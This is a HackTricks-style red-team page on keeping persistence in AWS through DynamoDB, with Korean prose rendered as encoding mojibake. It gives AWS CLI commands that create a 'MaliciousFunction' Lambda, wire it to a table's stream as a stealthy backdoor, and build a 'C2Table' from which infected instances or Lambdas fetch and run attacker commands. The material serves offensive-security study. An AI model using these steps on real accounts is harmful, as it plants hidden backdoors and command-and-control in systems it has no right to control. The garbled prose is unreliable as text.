# AWS - DynamoDB Persistence

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— PRì„ ì œì¶œ**í•˜ì„¸ìš”.

</details>

### DynamoDB

ë” ë§ì€ ì •ë³´ë¥¼ ì–»ìœ¼ë ¤ë©´ ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="../aws-services/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-dynamodb-enum.md)
{% endcontent-ref %}

### Lambda ë°±ë„ì–´ë¥¼ ì‚¬ìš©í•œ DynamoDB íŠ¸ë¦¬ê±°

DynamoDB íŠ¸ë¦¬ê±°ë¥¼ ì‚¬ìš©í•˜ì—¬ ê³µê²©ìëŠ” ì•…ì„± Lambda í•¨ìˆ˜ë¥¼ í…Œì´ë¸”ê³¼ ì—°ê²°í•¨ìœ¼ë¡œì¨ **ì€ë°€í•œ ë°±ë„ì–´**ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Lambda í•¨ìˆ˜ëŠ” í•­ëª©ì´ ì¶”ê°€, ìˆ˜ì • ë˜ëŠ” ì‚­ì œë  ë•Œ íŠ¸ë¦¬ê±°ë  ìˆ˜ ìˆìœ¼ë©°, ê³µê²©ìëŠ” AWS ê³„ì • ë‚´ì—ì„œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Create a malicious Lambda function
aws lambda create-function \
--function-name MaliciousFunction \
--runtime nodejs14.x \
--role <LAMBDA_ROLE_ARN> \
--handler index.handler \
--zip-file fileb://malicious_function.zip \
--region <region>

# Associate the Lambda function with the DynamoDB table as a trigger
aws dynamodbstreams describe-stream \
--table-name TargetTable \
--region <region>

# Note the "StreamArn" from the output
aws lambda create-event-source-mapping \
--function-name MaliciousFunction \
--event-source <STREAM_ARN> \
--region <region>
```
{% endcode %}

ì§€ì†ì„±ì„ ìœ ì§€í•˜ê¸° ìœ„í•´ ê³µê²©ìëŠ” DynamoDB í…Œì´ë¸”ì—ì„œ í•­ëª©ì„ ìƒì„±í•˜ê±°ë‚˜ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¡œ ì¸í•´ ì•…ì„± Lambda í•¨ìˆ˜ê°€ íŠ¸ë¦¬ê±°ë˜ì–´ ê³µê²©ìëŠ” Lambda í•¨ìˆ˜ì™€ ì§ì ‘ ìƒí˜¸ì‘ìš©í•˜ì§€ ì•Šê³ ë„ AWS ê³„ì • ë‚´ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### C2 ì±„ë„ë¡œì„œì˜ DynamoDB

ê³µê²©ìëŠ” DynamoDB í…Œì´ë¸”ì„ **ëª…ë ¹ ë° ì œì–´ (C2) ì±„ë„**ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ê³µê²©ìëŠ” ëª…ë ¹ì„ í¬í•¨í•˜ëŠ” í•­ëª©ì„ ìƒì„±í•˜ê³ , ê°ì—¼ëœ ì¸ìŠ¤í„´ìŠ¤ ë˜ëŠ” Lambda í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ëŸ¬í•œ ëª…ë ¹ì„ ê°€ì ¸ì™€ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
# Create a DynamoDB table for C2
aws dynamodb create-table \
--table-name C2Table \
--attribute-definitions AttributeName=CommandId,AttributeType=S \
--key-schema AttributeName=CommandId,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--region <region>

# Insert a command into the table
aws dynamodb put-item \
--table-name C2Table \
--item '{"CommandId": {"S": "cmd1"}, "Command": {"S": "malicious_command"}}' \
--region <region>
```

ê°ì—¼ëœ ì¸ìŠ¤í„´ìŠ¤ë‚˜ ëŒë‹¤ í•¨ìˆ˜ëŠ” ì£¼ê¸°ì ìœ¼ë¡œ C2 í…Œì´ë¸”ì„ í™•ì¸í•˜ì—¬ ìƒˆë¡œìš´ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê³  ì„ íƒì ìœ¼ë¡œ ê²°ê³¼ë¥¼ í…Œì´ë¸”ì— ë³´ê³ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ê°ì—¼ëœ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ì§€ì†ì„±ê³¼ ì œì–´ë¥¼ ìœ ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™‘**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
